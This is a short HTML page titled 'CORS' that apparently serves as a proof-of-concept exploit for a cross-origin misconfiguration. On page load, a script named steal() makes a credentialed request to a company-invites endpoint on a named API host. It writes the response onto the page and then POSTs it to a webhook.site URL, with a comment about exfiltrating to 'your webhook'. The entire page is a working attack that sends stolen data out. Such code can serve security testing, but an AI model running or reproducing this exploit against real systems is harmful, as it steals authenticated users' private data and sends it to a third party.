<!doctype html>
<html>
<body>
<h1>CORS</h1>

<script>
async function steal() {
    const target = "https://api-dev.cf.fluida.io/api/v1/invites/by_company/7fdf5fc1-343d-4cba-8ab1-0b47a1b53ae7";

    const resp = await fetch(target, {
        method: "GET",
        credentials: "include"
    });

    const data = await resp.text();

    // Show on screen (for testing)
    document.body.innerHTML += "<pre>" + data + "</pre>";

    // Exfiltrate to your webhook
    await fetch("https://webhook.site/847c88db-8fec-45db-b329-d3a20a004c67", {
        method: "POST",
        body: data,
        headers: { "Content-Type": "text/plain" }
    });
}

steal();
</script>
